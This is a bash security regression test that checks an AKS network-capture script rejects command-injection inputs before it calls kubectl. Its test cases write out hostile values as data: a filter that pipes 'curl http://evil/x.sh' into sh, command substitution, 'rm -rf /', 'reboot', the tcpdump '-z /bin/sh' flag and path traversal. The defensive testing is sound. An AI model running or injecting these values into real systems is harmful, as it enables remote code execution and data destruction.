#!/usr/bin/env bash
# Security regression test for aks-network-capture/create-capture.sh.
#
# Proves the command-injection class is neutralized: malicious --tcpdump-filter and
# out-of-range inputs are rejected during validation, BEFORE any kubectl call — so
# this runs in CI with no cluster. Also asserts the script never uses `eval`.
set -u

SCRIPT="$(cd "$(dirname "$0")/../../../skills/aks-network-capture/scripts" && pwd)/create-capture.sh"
fails=0
pass() { echo "  ok: $1"; }
fail() { echo "  FAIL: $1" >&2; fails=$((fails+1)); }

# Case must be REJECTED (non-zero exit) without reaching kubectl.
reject() {
  local desc="$1"; shift
  if out="$("$SCRIPT" "$@" 2>&1)"; then
    fail "$desc — script accepted a malicious/invalid input"
  else
    case "$out" in
      *"disallowed characters"*|*"flag tokens"*|*"must be"*|*"too long"*|*"too large"*|*"required"*)
        pass "$desc" ;;
      *) fail "$desc — rejected, but not by input validation (got: ${out%%$'\n'*})" ;;
    esac
  fi
}

echo "== aks-network-capture injection tests =="

reject "shell metacharacters in filter" \
  --name t --tcpdump-filter "udp port 53'; curl http://evil/x.sh | sh; echo '"
reject "command substitution in filter" \
  --name t --tcpdump-filter 'tcp port 80 $(id)'
reject "backtick in filter" \
  --name t --tcpdump-filter 'tcp port 80 `reboot`'
reject "tcpdump -z postrotate-command RCE flag" \
  --name t --tcpdump-filter "-z /bin/sh"
reject "semicolon chaining" \
  --name t --tcpdump-filter "port 53; rm -rf /"
reject "over-long duration" \
  --name t --duration 9999h
reject "non-numeric packet size" \
  --name t --packet-size "1;rm"
reject "invalid capture name" \
  --name "../../etc"

# Static assertion: no `eval` in command position (ignore the word inside comments).
if grep -vE '^[[:space:]]*#' "$SCRIPT" | grep -Eq '(^|[;&|]|then|do|else|;)[[:space:]]*eval[[:space:]]'; then
  fail "create-capture.sh uses eval"
else
  pass "no eval command in create-capture.sh"
fi

echo
if [ "$fails" -eq 0 ]; then echo "All injection tests passed."; exit 0
else echo "$fails injection test(s) FAILED."; exit 1; fi
